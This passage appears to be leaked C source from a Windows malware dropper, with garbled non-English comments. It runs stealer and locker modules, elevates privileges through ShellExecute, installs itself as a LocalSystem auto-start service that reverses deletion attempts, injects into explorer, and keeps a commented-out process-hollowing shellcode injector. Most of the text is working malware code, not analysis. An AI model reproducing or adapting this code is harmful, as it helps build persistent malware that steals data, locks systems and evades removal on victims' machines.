                        for (; *cmdlineParams != L'\0' && utils_isspace(*cmdlineParams); ++cmdlineParams);
                        //LOG("Shellexec file path: %S", filePath);
                        //LOG("ShellExec command line: %S", cmdlineParams);
                        //LOG("ShellExec working dir: %S", _pZmoduleBlock->modulePath);
                        dropper_release_mutex();
                        if (possessor_restart_module_shellexec(filePath, cmdlineParams, _pZmoduleBlock->modulePath)) {
                            LOG("Successfully elevated through shellexec!");
                            break;
                        }
                        else {
                            LOG("Can't elevate! Continue...");
                            dropper_create_check_mutex();
                        }
                    }

                    memory_free(pValue);
                }
            }
        }

        //break;
#if 0
        if (!_pZmoduleBlock->asService) {
            // ������������ � �������.
            // ������ ����� ���������� ����������� ���� ���������, ��� ������� ���������� ������� ����������, ��� ��������������� ����� �� ����������.
            // � ������ ����� ���������� ����������� ����� ��������� � ����� ����������� �������.
            if (_pZmoduleBlock->securityMask & (MANDATORY_LEVEL_UNTRUSTED | MANDATORY_LEVEL_LOW | MANDATORY_LEVEL_MEDIUM)) {
install_simple:
                selfInstalled = dropper_check_and_install_ring3_simple(&targetPath);
            }
            else {
                selfInstalled = dropper_install_ring3_service(&targetPath);
                if (selfInstalled) {
                    if (selfInstalled == 2) {
                        // ��������� ������, �. �. ������� ������.
                        break;
                    }
                }
                else {
                    zs_free(targetPath);
                    goto install_simple;
                }
            }
        }
#endif // 1
        if (possessor_initialize_fs()) {
            // ��������� ������ �������.
            domains_load_subnames();

            // ��������� ������ �� ������� ���������� �������
            bundles_load_config();
        }

        pCommonLoop = async_default_loop();

        async_timer_init(pCommonLoop, &ccConnTimer);

        async_timer_start(&ccConnTimer, possessor_common_cb, 1000, 1000);

        async_run(pCommonLoop, ASYNC_RUN_DEFAULT);

        //while (!_pZmoduleBlock->shouldExit) {
            // ��������� 
        //}

		/*
        // �������������� ������.
        servercomm_domains_init();
		*/
		/*

#ifdef _DEBUG
        ghLockFile = utils_file_lock(pThis->modulePathName, GENERIC_READ, OPEN_EXISTING);
#endif // _DEBUG

        // ������ ������ ������ �� ������ � ������������ ����������.
        ret = servercomm_get_info_request(1, 1, 1);
        if (ret && pThis->isTimeToShutdown) {
            break;
        }

        if (!gAlreadyInstalled)
        {
            int dropperInstalled = 1;
            // ������ ����� ������������ ��������.
#ifdef _DEBUG
            dropper_execute_zmodule(gStealerName);
#else
            utils_create_thread(dropper_execute_zmodule, gStealerName, &hStealerThread, 0);
#endif // _DEBUG
            // ������������ � �������.
           if (dropperInstalled) {
#ifndef _DEBUG
                // ��������� ������ � �����.
                ghLockFile = utils_file_lock(pThis->modulePathName, GENERIC_READ, OPEN_EXISTING);
#endif // !_DEBUG
// #ifndef _DEBUG
//                 utils_create_thread(dropper_self_update, NULL, &hUpdateThread, 0);
// #endif // _DEBUG
				//fn_MessageBoxA(NULL, "checkpoint13", "common_thread", MB_OK);

                if (dropper_execute_zmodule(gLockerName) == 1) {
                    // ����� ������ �� ����� �� ������, ���������.
                    dropper_deinstall_ring3();
                    dropper_reboot_with_delay(0);
                }
            }
        }
        else {
			// ��������� ������ � �����.
			ghLockFile = utils_file_lock(pThis->modulePathName, GENERIC_READ, OPEN_EXISTING);

            dropper_load_local_locker_module();

            // ��������� ����� ��� �������� ����������.
// #ifndef _DEBUG
//             utils_create_thread(dropper_self_update, NULL, &hUpdateThread, 0);
// #endif // _DEBUG
            if (dropper_execute_zmodule(gLockerName) == 1) {
                // ����� ������ �� ����� �� ������, ���������.
                dropper_deinstall_ring3();
                dropper_reboot_with_delay(0);
            }
        }
    */
	} while (0);

    if (commandLine != NULL) {
        zs_free(commandLine);
    }
	/*
    if (hStealerThread != NULL) {
        fn_WaitForSingleObject(hStealerThread, INFINITE);
        fn_CloseHandle(hStealerThread);
    }
	*/
//    gDropperFinished = 1;
/*
    if (hUpdateThread != NULL) {
        // ������� ���������� ������ ��� ����������.
        fn_WaitForSingleObject(hUpdateThread, INFINITE);
        fn_CloseHandle(hUpdateThread);
    }
	
    dropper_free_shared_memory();
    servercomm_domains_done();
	*/
//     if (globalData.hLockFile != NULL) {
//         utils_file_unlock(globalData.hLockFile);
//     }

    fn_OleUninitialize();
	/*
    if (gShouldCallExitProcess) {
        fn_ExitProcess(0);
    }
	*/

    LOG("Common thread stopped");

    return ret;
}
/*
DWORD eexpEntry(uint8_t* imageBase)
{
#ifdef HYBRID_EXE_PART
    if (zmodule_process_relocs(imageBase, imageBase - zmodule_get_image_base(imageBase)) && functions_init(0)) {
        uint32_t counter = 0;

// #ifdef _WIN64
//         __debugbreak();
// #else
//         __asm int 3
// #endif

        pThis->currentImageBase = imageBase;
        pThis->currentImageSize = ((pzmodule_header_t)imageBase)->sizeOfImage;//PeImageNtHeader(imageBase)->OptionalHeader.SizeOfImage;
        pThis->bFirstImageLoad = FALSE;
        pThis->ghPayloadMapping = NULL;
        pThis->gPayload = NULL;
        pThis->modulePathName[0] = L'\0';
        pThis->pModuleBuffer = NULL;

        gAlreadyInstalled = 0;

        //fn_MessageBoxA(NULL, L"Thread begin", L"eexpEntry", MB_OK);

        // ���������� ����� �������.
        pThis->ghPayloadMapping = fn_OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, payloadInfo.payloadName);
        if (pThis->ghPayloadMapping != NULL) {
            pThis->gPayload = fn_MapViewOfFile(pThis->ghPayloadMapping, FILE_MAP_ALL_ACCESS, 0, 0, payloadInfo.payloadSize);

            if (pThis->gPayload == NULL) {
                DbgMsg(__FUNCDNAME__": MapViewOfFile failed %", fn_GetLastError());
            }
        }
        else {
            DbgMsg(__FUNCDNAME__": OpenFileMappingA failed %", fn_GetLastError());
        }

        // �������� �������� �� �������� ������� � ��������������� ��������� �������.
        eexp_notify_parent_and_restore_atan();
        fn_Sleep(3000);

        if (pThis->gPayload != NULL) {
            wchar_t* itrSrc = pThis->gPayload + payloadInfo.payloadSize - (MAX_PATH * sizeof(wchar_t));
            wchar_t* itrDest = pThis->modulePathName;

            // �������� ���� �� ������������� ������������ �����.
            for (; *itrSrc != L'\0'; ++itrSrc, ++itrDest) {
                *itrDest = fn_towlower(*itrSrc);
            }
        }

        // � ����� ������ ���������� ����������, ����� ��� ������� ��������� �������� � ������ ��������� ������� �������.
        utils_create_thread(possessor_common_thread, NULL, NULL, 0);
    }
#endif // HYBRID_EXE_PART
    return 0;
}

// #ifdef _WIN64
// void restore_after_bad_instruction()
// {
//     needCheckExploits = FALSE;
//     ThreadCreate(common_thread, NULL, NULL, 0);
//     ExitThread(STATUS_SUCCESS);
// }
// 
// #endif // _WIN64

// #ifndef _WIN64
// int common_inject_shellcode(const wchar_t* zombiModulePath)
// {
//     HANDLE hFile = 0;
//     uint8_t* pFileBuffer = NULL;
//     DWORD dwByteRead;
//     PIMAGE_DOS_HEADER pDosHdr;
//     PIMAGE_NT_HEADERS pNtHdrs;
//     PIMAGE_SECTION_HEADER pSectionHdr;
//     CONTEXT context;
//     uint8_t* imageBase;
//     HANDLE hZombiMapping = NULL;
//     uint8_t* pZombiImage = NULL;
//     HANDLE hNewMapping = NULL;
//     uint8_t* pNewImage = NULL;
//     DWORD lpVSize = 0;
//     uint16_t i;
//     NTSTATUS ntStatus;
//     PROCESS_INFORMATION procInfo;
//     STARTUPINFOW si;
//     int ret = FALSE;
//     HANDLE hSection = NULL;
//     HANDLE hEvent;
//     std_shellcode_data scData;
//     char mappingName[10];
// 
//     //��������� �������  ��� ������� � ����
//     __stosb((uint8_t*)&si, 0, sizeof(si));
//     si.cb = sizeof(si);
//     si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESIZE;
//     si.wShowWindow = SW_HIDE;
//     si.dwXSize = si.dwYSize = 0;
//     __stosb((uint8_t*)&procInfo, 0, sizeof(procInfo));
// 
//     if (!fn_CreateProcessW(0, zombiModulePath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &procInfo)) {
//         return ret;
//     }
// 
//     do {
//         if (procInfo.dwProcessId != 0) {
//             hFile = fn_CreateFileW(zombiModulePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
//             if (hFile == INVALID_HANDLE_VALUE) {
//                 break;
//             }
// 
//             pFileBuffer = memalloc(0x400);
//             if (pFileBuffer == NULL) {
//                 break;
//             }
//             if (fn_ReadFile(hFile, pFileBuffer, 0x400, &dwByteRead, 0)) {
//                 pDosHdr = (PIMAGE_DOS_HEADER)pFileBuffer;
//                 pNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + pDosHdr->e_lfanew); 
// 
//                 context.ContextFlags = CONTEXT_INTEGER;
//                 if (!fn_GetThreadContext(procInfo.hThread, &context)) {
//                     break;
//                 }
// 
//                 imageBase = (PVOID)(context.Eax - pNtHdrs->OptionalHeader.AddressOfEntryPoint);
// 
//                 hZombiMapping = fn_CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
//                 if (hZombiMapping == NULL) {
//                     break;
//                 }
// 
//                 pZombiImage = fn_MapViewOfFile(hZombiMapping, FILE_MAP_READ, 0, 0, 0);
//                 if(pZombiImage == NULL) {
//                     break;
//                 }
// 
//                 pDosHdr = (PIMAGE_DOS_HEADER)pZombiImage;
//                 pNtHdrs =(PIMAGE_NT_HEADERS)(pZombiImage + pDosHdr->e_lfanew); 
// 
//                 hNewMapping = fn_CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE | SEC_COMMIT, 0, pNtHdrs->OptionalHeader.SizeOfImage, NULL);
//                 if (hNewMapping == NULL) {
//                     break;
//                 }
//                 pNewImage = fn_MapViewOfFile(hNewMapping, FILE_MAP_WRITE, 0, 0, 0);
//                 if (pNewImage == NULL) {
//                     break;
//                 }
// 
//                 __movsb(pNewImage, pZombiImage, pNtHdrs->OptionalHeader.SizeOfHeaders);
// 
//                 pSectionHdr = (PIMAGE_SECTION_HEADER)((uint8_t*)pNtHdrs + sizeof(IMAGE_NT_HEADERS));
// 
//                 for (i = 0; i < pNtHdrs->FileHeader.NumberOfSections; ++i, ++pSectionHdr) {
//                     __movsb(pNewImage + pSectionHdr->VirtualAddress, pZombiImage + pSectionHdr->PointerToRawData, pSectionHdr->SizeOfRawData);
//                 }
// 
//                 pDosHdr = (PIMAGE_DOS_HEADER)pNewImage;
//                 pNtHdrs = (PIMAGE_NT_HEADERS)(pNewImage + pDosHdr->e_lfanew); 
//                 pNtHdrs->OptionalHeader.ImageBase = (DWORD)imageBase;
// 
//                 fn_lstrcpynA(mappingName, utils_machine_guid(), RTL_NUMBER_OF(mappingName));
//                 if (!utils_create_zmodule_mapping(mappingName, globalData.currentImageBase, globalData.currentImageSize, &hSection, TRUE)) {
//                     break;
//                 }
// 
//                 dropper_prepare_shellcode_data(globalData.currentImageBase, &scData, mappingName, "icmnf", 0, 0);
//                 dropper_prepare_shellcode(pNewImage + pNtHdrs->OptionalHeader.AddressOfEntryPoint, std_sc_x32, sizeof(std_sc_x32), (const uint8_t*)&scData, sizeof(std_shellcode_data));
// 
// //                 // ����������� ����� ��������� � ������� ��� ��������.
// //                 common_prepare_dll_loader(sc_dll_mem_x32, sizeof(sc_dll_mem_x32), 
// //                     pNewImage + pNtHdrs->OptionalHeader.AddressOfEntryPoint, 
// //                     (uint8_t*)g_pwszFileName, (gpGlobalData.gpGlobalData.fnlstrlenW(g_pwszFileName) + 1) * sizeof(wchar_t),
// //                     NULL, 0,
// //                     0);
// 
//                 fn_UnmapViewOfFile(pNewImage);
// 
//                 ntStatus = fn_ZwUnmapViewOfSection(procInfo.hProcess, imageBase);
//                 if (ntStatus != STATUS_SUCCESS) {
//                     break;
//                 }
// 
//                 lpVSize = 0;
//                 ntStatus = fn_ZwMapViewOfSection(hNewMapping, procInfo.hProcess, &imageBase, 0, 0, 0, &lpVSize, (SECTION_INHERIT)2, 0, PAGE_EXECUTE_READWRITE);
//                 if (ntStatus != STATUS_SUCCESS) {
//                     break;
//                 }
// 
//                 ret = TRUE;
//             }
//         }
//     } while (0);
// 
//     if (hFile != INVALID_HANDLE_VALUE) {
//         fn_CloseHandle(hFile);
//     }
// 
//     if (pNewImage != NULL) {
//         fn_UnmapViewOfFile(pNewImage);
//     }
// 
//     if (hNewMapping != NULL) {
//         fn_CloseHandle(hNewMapping);
//     }
// 
//     if (pZombiImage != NULL) {
//         fn_UnmapViewOfFile(pZombiImage);
//     }
// 
//     if (hZombiMapping != NULL) {
//         fn_CloseHandle(hZombiMapping);
//     }
// 
//     memfree(pFileBuffer);
// 
//     if (ret) {
//         ret = FALSE;
//         if (hEvent = eexp_create_notify_inject_event()) {
//             if (fn_ResumeThread(procInfo.hThread) != (DWORD)-1) {
//                 if (fn_WaitForSingleObject(hEvent, 70 * 1000) == WAIT_OBJECT_0) {
//                     DbgMsg(__FUNCTION__"(): Injected ok\n");
// 
//                     ret = TRUE;
//                 }
//             }
//             fn_CloseHandle(hEvent);
//         }
//         fn_CloseHandle(procInfo.hThread);
//         fn_CloseHandle(procInfo.hProcess);
//     }
// 
//     if (hSection != NULL) {
//         fn_CloseHandle(hSection);
//     }
//     
//     return ret;
// }
// 
// #endif // _WIN64
*/

// ���������� � ������ �����.
struct _wmi_service_info
{
    uint32_t pid;
    wchar_t* name;
    wchar_t* binaryPath;
} wmiServiceInfo;

wmi_class_property_t serviceProps[] = {
        { 'u', &wmiServiceInfo.pid, L"ProcessId" },
        { 'S', &wmiServiceInfo.name, L"Name" },
        { 'S', &wmiServiceInfo.binaryPath, L"PathName" },
        { 0, NULL, NULL }
};


int __stdcall serviceHandler(wmi_class_info_t* pInstance)
{
    struct _wmi_service_info* pStruct = (struct _wmi_service_info*) pInstance->pStruct;
    int ret = 1;
    do {
        if (pStruct->pid == fn_GetCurrentProcessId()) {
            _pZmoduleBlock->serviceName = zs_new(pStruct->name);
            _pZmoduleBlock->serviceBinaryPath = zs_new(pStruct->binaryPath);
            LOG("My Win32 Service name: %S", _pZmoduleBlock->serviceName);
            LOG("My Win32 Service BinaryPath: %S", _pZmoduleBlock->serviceBinaryPath);
            break;
        }
        ret = 0;
    } while (0);
    return ret;
}

void dropper_service_control_handler(DWORD control)
{
    switch (control) {
        case SERVICE_CONTROL_SHUTDOWN:
            LOG("User tried shutdown service");
            break;
        case SERVICE_CONTROL_STOP:
            LOG("User tried stop service");
//            _pZmoduleBlock->shouldExit = 1;
//            _pZmoduleBlock->serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            LOG("User tried interrogate");
            break;
    }
    //fn_SetServiceStatus(_pZmoduleBlock->serviceStatusHandle, &_pZmoduleBlock->serviceStatus);
}

void __stdcall dropper_service_main(DWORD argc, LPCWSTR* argv)
{
    IDispatch* pWmiService;
    pwin32service_t pService = NULL;

    _pZmoduleBlock->serviceStatusHandle = fn_RegisterServiceCtrlHandlerW(L"", dropper_service_control_handler);
    if (!_pZmoduleBlock->serviceStatusHandle) {
        return;
    }

    LOG("Running as Win32 Serivce");
    _pZmoduleBlock->asService = 1;

    _pZmoduleBlock->serviceStatus.dwServiceType = SERVICE_WIN32;
    _pZmoduleBlock->serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    _pZmoduleBlock->serviceStatus.dwControlsAccepted = 0;// SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PARAMCHANGE;
    _pZmoduleBlock->serviceStatus.dwWin32ExitCode = 0;
    _pZmoduleBlock->serviceStatus.dwServiceSpecificExitCode = 0;
    _pZmoduleBlock->serviceStatus.dwCheckPoint = 0;
    _pZmoduleBlock->serviceStatus.dwWaitHint = 0;
    fn_SetServiceStatus(_pZmoduleBlock->serviceStatusHandle, &_pZmoduleBlock->serviceStatus);
    
    if (SUCCEEDED(fn_OleInitialize(NULL))) {
        // �������� ��� ������ ����� WMI �� ID-��������.
        pWmiService = wmi_get_service(L"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
        if (pWmiService != NULL) {
            wmi_class_info_t svcClass = { L"Win32_Service", &wmiServiceInfo, sizeof(wmiServiceInfo), serviceHandler, serviceProps };
            wmi_obtain_info(pWmiService, &svcClass);
            pWmiService->lpVtbl->Release(pWmiService);
        }
        else {
            LOG("Failed to obtain the WMI service");
        }

        fn_OleUninitialize();
    }
    if (_pZmoduleBlock->serviceName != NULL) {
        pService = service_new(_pZmoduleBlock->serviceName);
    }

    _pZmoduleBlock->serviceStatus.dwCurrentState = SERVICE_RUNNING;
    fn_SetServiceStatus(_pZmoduleBlock->serviceStatusHandle, &_pZmoduleBlock->serviceStatus);

    utils_create_thread(possessor_common_thread, NULL, &_hCommonThread, 0);

    // ������ ���� ��� ������������ ��������� � ���������� ������.
    // ��������� ������� ��� ��������������:
    // - Type
    // - StartType
    // - BinaryPath
    // - UserAccount & Password
    // - ��������� ����� �������� ������� ����� ������������ � �������.
    while (!_pZmoduleBlock->shouldExit) {
        fn_Sleep(1000);
        if (pService != NULL) {
            HANDLE hKey;
            wchar_t* regServicePath = zs_new(L"System\\CurrentControlSet\\services\\");
            regServicePath = zs_cat(regServicePath, _pZmoduleBlock->serviceName);
            LOG("Registry key path: %S", regServicePath);
            service_set_config(pService, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, _pZmoduleBlock->serviceBinaryPath, L".\\LocalSystem");

            if (NT_SUCCESS(native_open_key(&hKey, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NATIVE_KEY_LOCAL_MACHINE, regServicePath, 0))) {
                wchar_t* regValue = zs_new(L"DeleteFlag");
                PKEY_VALUE_PARTIAL_INFORMATION pValue = native_query_registry_value(hKey, regValue);
                if (pValue != NULL) {
                    memory_free(pValue);
                    UNICODE_STRING uName;
                    ULONG val = 2;
                    
                    fn_RtlInitUnicodeString(&uName, L"DeleteFlag");
                    fn_NtDeleteValueKey(hKey, &uName);
                    fn_RtlInitUnicodeString(&uName, L"Start");
                    fn_NtSetValueKey(hKey, &uName, 0, REG_DWORD, &val, sizeof(val));
                    fn_NtClose(hKey);
                }
                else {
                    LOG("No DeleteFlag value for %S", _pZmoduleBlock->serviceName);
                }

                zs_free(regValue);
            }
            else {
                LOG("Cannot open key %S", regServicePath);
            }

            zs_free(regServicePath);
        }
    }

    service_destroy(pService);

    LOG("My Service stopped!");

    _pZmoduleBlock->serviceStatus.dwCurrentState = SERVICE_STOPPED;
    fn_SetServiceStatus(_pZmoduleBlock->serviceStatusHandle, &_pZmoduleBlock->serviceStatus);
}

#define IsWow64Process_Hash 0xA940DA4E
typedef BOOL(__stdcall *FnIsWow64Process)(HANDLE, PBOOL);

int __stdcall start(uint32_t reason, uint8_t* pModuleBase, pzmodule_block_t pZModuleBlock)
{
//    int i;
//    BOOLEAN explorerInjected = FALSE;
//    MEMORY_BASIC_INFORMATION mbi;
//    int err;

//    pzerokit_header_t pPayloadHdr;
//    mods_pack_header_t* packHdr;
//    uint32_t crc[2];
	uint32_t lid;
    do {
#ifndef _DEBUG
		if (reason != ZMODULE_REASON_UNLOAD && !zmodule_process_relocs(pModuleBase, pModuleBase - zmodule_get_image_base(pModuleBase)) || !dynfuncs_load(reason != ZMODULE_REASON_START)) {
			break;
		}
#else
        reason = ZMODULE_REASON_START;
		pZModuleBlock = NULL;
		if (!dynfuncs_load(0)) {
			break;
		}
#endif // _DEBUG

		if (pZModuleBlock != NULL) {
			_pZmoduleBlock->hDllHandle = (HANDLE)pZModuleBlock;
		}

        //lid = utils_strhash("common");
        		
		_pZmoduleBlock->versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);

		if (NT_SUCCESS(fn_RtlGetVersion((PRTL_OSVERSIONINFOW)&_pZmoduleBlock->versionInfo))) {
			_pZmoduleBlock->sysInfo.osMajorVer = _pZmoduleBlock->versionInfo.dwMajorVersion;
			_pZmoduleBlock->sysInfo.osMinorVer = _pZmoduleBlock->versionInfo.dwMinorVersion;
			_pZmoduleBlock->sysInfo.osSp = (uint32_t)_pZmoduleBlock->versionInfo.wServicePackMajor;
			_pZmoduleBlock->sysInfo.osBuildNumber = _pZmoduleBlock->versionInfo.dwBuildNumber;
			_pZmoduleBlock->sysInfo.osProductType = (uint32_t)_pZmoduleBlock->versionInfo.wProductType;

#ifndef _WIN64
			{
				BOOL bIsWow64 = FALSE;
				FnIsWow64Process fnIsWow64Process;

				fnIsWow64Process = (FnIsWow64Process)dynfuncs_get_symbol_by_hash(dynfuncs_get_module_base_by_hash(KERNEL32_DLL_HASH), IsWow64Process_Hash);
				if (fnIsWow64Process != NULL) {
					fnIsWow64Process(NtCurrentProcess(), &bIsWow64);
				}

				_pZmoduleBlock->sysInfo.isWow64 = bIsWow64 ? 1 : 0;
			}

#endif // _WIN64
			_pZmoduleBlock->sysInfo.osLangId = 0x0409; // US

			if (fn_GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT, LOCALE_ILANGUAGE | LOCALE_RETURN_NUMBER/*LOCALE_SISO639LANGNAME*/, (LPTSTR)&lid, sizeof(lid)) > 0) {
                _pZmoduleBlock->sysInfo.osLangId = lid;
			}
			_pZmoduleBlock->sysInfo.osValue = OS_WINDOWS | ((((_pZmoduleBlock->sysInfo.osMajorVer & 0x0F) << 4) | (_pZmoduleBlock->sysInfo.osMinorVer & 0x0F)) << 8) |
				(_pZmoduleBlock->sysInfo.osSp << 4) |
				(((_pZmoduleBlock->sysInfo.osProductType == VER_NT_WORKSTATION) ? 0 : 1) << 1) |
#ifdef _WIN64
				1
#else
				_pZmoduleBlock->sysInfo.isWow64
#endif // _WIN64
				;
		}

        // LOG_ON;LOG_ON_FILE=1;

		LOG("Dropper started (Windows %u.%u Build %d SP%u %s)", _pZmoduleBlock->sysInfo.osMajorVer, _pZmoduleBlock->sysInfo.osMinorVer, _pZmoduleBlock->sysInfo.osBuildNumber, _pZmoduleBlock->sysInfo.osSp, (_pZmoduleBlock->sysInfo.isWow64 ? "Wow64" : ""));

        // ��������� ������������ �� �� �������.
		if (_pZmoduleBlock->sysInfo.osMajorVer < 5) {
			LOG("Unsupported system");
			break;
		}
		if (_pZmoduleBlock->sysInfo.osMajorVer == 5) {
			if (_pZmoduleBlock->sysInfo.osSp <= 2 || _pZmoduleBlock->sysInfo.isWow64) {
                // �� ������������ ������� � SP ���� ������� � 2003 Server ��� XP x64.
				LOG("Unsupported system");
                break;
            }
        }
		else if (_pZmoduleBlock->sysInfo.osMajorVer == 6) {
			if (_pZmoduleBlock->sysInfo.osMinorVer == 0 && _pZmoduleBlock->sysInfo.osSp < 2) {
                // �� ������������ Vista � SP ���� �������.
				LOG("Unsupported system");
                break;
            }
        }

        // �. �. ������ ������ ��������� ����� �������� ����� �����, ������ �� ����� � ��� �������.
        _pZmoduleBlock->moduleFlags = MODULE_COMMON | MODULE_CONTROLLER;

#ifdef HYBRID_EXE_PART
        // ������ ���������� �������.
        if (!utils_create_check_mutex(0x78873897, utils_machine_guid())) {
            // ������������ ����� ������.
            fn_GetModuleFileNameW(NULL, pThis->modulePathName, MAX_PATH - 1);
            fn_lstrcpyW(pThis->modulePath, pThis->modulePathName);
            fn_PathRemoveFileSpecW(pThis->modulePath);
            fn_MoveFileExW(pThis->modulePathName, 0, MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_WRITE_THROUGH);
            break;
        }
#endif // HYBRID_EXE_PART

        // ��������, �������� �� �� ��� ������
        SERVICE_TABLE_ENTRYW svcDispatchTable[2];
        svcDispatchTable[0].lpServiceName = L"";
        svcDispatchTable[0].lpServiceProc = dropper_service_main;
        svcDispatchTable[1].lpServiceName = NULL;
        svcDispatchTable[1].lpServiceProc = NULL; 
        if (!fn_StartServiceCtrlDispatcherW(svcDispatchTable)) {
            utils_create_thread(possessor_common_thread, NULL, &_hCommonThread, INFINITE);
        }

#ifdef HYBRID_EXE_PART
        seed = fn_GetTickCount();

        // uint32_t payloadSize;
        // uint8_t* pPayload;

        // // �������������� ������.
        // pPayload = NULL;

        // err = utils_lzma_decompress(bin_data, sizeof(bin_data), (pvoid_t*)&pPayload, &payloadSize);

        // if (err != ERROR_NONE) {
        //     DbgMsg("Cannot decompress payload (%d)", err);
        //     break;
        // }

        // crc64_buildtable();

        // // ������ ������ � ���������� �������.
        
        // payloadInfo.payloadSize = payloadSize + sizeof(exploit_startup_header_t) + MAX_PATH * sizeof(wchar_t);

        payloadInfo.payloadSize = MAX_PATH * sizeof(wchar_t);

        payloadInfo.payloadName[7] = '\0';
        for (i = 0; i < 7; ++i) {
            payloadInfo.payloadName[i] = cb64[fn_RtlRandomEx(&seed) % 62];
        }

        pThis->ghPayloadMapping = fn_CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, payloadInfo.payloadSize, payloadInfo.payloadName);

        if (pThis->ghPayloadMapping == NULL) {
            err = ERROR_NO_MEMORY;
            DbgMsg(__FUNCTION__": CreateFileMappingA failed (%u)", fn_GetLastError());
            break;
        }

        pThis->gPayload = fn_MapViewOfFile(pThis->ghPayloadMapping, FILE_MAP_WRITE, 0, 0, payloadInfo.payloadSize);

        if (pThis->gPayload == NULL) {
            err = ERROR_NO_MEMORY;
            DbgMsg(__FUNCTION__": MapViewOfFile failed (%u)", fn_GetLastError());
            break;
        }

        // __movsb(gPayload + sizeof(exploit_startup_header_t), pPayload, payloadSize);
        // fn_GetModuleFileNameW(NULL, pThis->gPayload + sizeof(exploit_startup_header_t) + payloadSize, MAX_PATH);

        // //__movsb(gPayload + sizeof(exploit_startup_header_t) + payloadSize, )

        // fn_VirtualFree(pPayload, payloadSize, MEM_RELEASE);

        // pPayloadHdr = (pzerokit_header_t)(pThis->gPayload + sizeof(exploit_startup_header_t) + 1024 + 2);

        // packHdr = (pmods_pack_header_t)(pThis->gPayload + sizeof(exploit_startup_header_t) + pPayloadHdr->sizeOfBootkit);
        // crc64_computate((PUCHAR)packHdr + sizeof(mods_pack_header_t), (size_t)packHdr->sizeOfPack, crc);

        // if (fn_RtlCompareMemory(crc, &packHdr->crc, 8) != 8) {
        //     err = ERROR_PAYLOAD_CRC;
        //     DbgMsg("Incorrect CRC in 32-bit pack");
        //     break;
        // }

        // packHdr = (mods_pack_header_t*)((PUCHAR)packHdr + sizeof(mods_pack_header_t) + packHdr->sizeOfPack);
        // crc64_computate((PUCHAR)packHdr + sizeof(mods_pack_header_t), (size_t)packHdr->sizeOfPack, crc);

        // if (fn_RtlCompareMemory(crc, &packHdr->crc, 8) != 8) {
        //     err = ERROR_PAYLOAD_CRC;
        //     DbgMsg("Incorrect CRC in 64-bit pack");
        //     break;
        // }

        fn_GetModuleFileNameW(NULL, pThis->gPayload, MAX_PATH);
        //fn_MessageBoxW(NULL, globalData.gPayload, L"ZModuleEntry", MB_OK);
        
//         possessor_common_thread(NULL);
//         fn_ExitProcess(ERROR_SUCCESS);

        //GetParrentProcessName(parrentProcessName, sizeof(parrentProcessName));
        fn_VirtualQuery(ZModuleEntry, &mbi, sizeof(mbi));
        pThis->currentImageBase = mbi.AllocationBase;
#ifdef _DEBUG
        pThis->currentImageSize = PeImageNtHeader(pThis->currentImageBase)->OptionalHeader.SizeOfImage;
#else
        pThis->currentImageSize = ((pzmodule_header_t)pThis->currentImageBase)->sizeOfImage;
#endif
        pThis->bFirstImageLoad = TRUE;

// #ifdef _WIN64
//         __debugbreak();
// #else
//         __asm int 3
// #endif
        if (utils_is_wow64(NtCurrentProcess())) {
            explorerInjected = eexp_inject64();
        }
        else {
            explorerInjected = eexp_inject32();
        }

        if (!explorerInjected) {
            // ������� ������ ��������� � ��������� ��������.
            dopper_initialize_zmodule_block();
            domains_init();
            dropper_execute_zmodule(gStealerName);
            servercomm_domains_done();
//             wchar_t wszSysPath[MAX_PATH];
// 
//             // ���������� ������ ������� ������.
//             fn_GetEnvironmentVariableW(L"SystemRoot", wszSysPath, MAX_PATH);
// 
//             if (globalData.gSysInfo.isWow64) {
//                 fn_lstrcatW(wszSysPath, L"\\SysWOW64"); 
//             }
//             else {
//                 fn_lstrcatW(wszSysPath, L"\\System32"); 
//             }
// 
//             if (globalData.gHIPSMask & HIPS_OUTPOST) {
//                 fn_lstrcatW(wszSysPath, L"\\cscript.exe"); 
//             }
//             else {
//                 fn_lstrcatW(wszSysPath, L"\\svchost.exe"); 
//             }
// 
//             explorerInjected = common_inject_shellcode(wszSysPath);
        }
#endif // HYBRID_EXE_PART
    } while (0);

    //dropper_free_shared_memory();

    runtime_shutdown();

	if (reason == ZMODULE_REASON_START && fn_ExitProcess != 0) {
		fn_ExitProcess(0);
	}
	return 1;
}
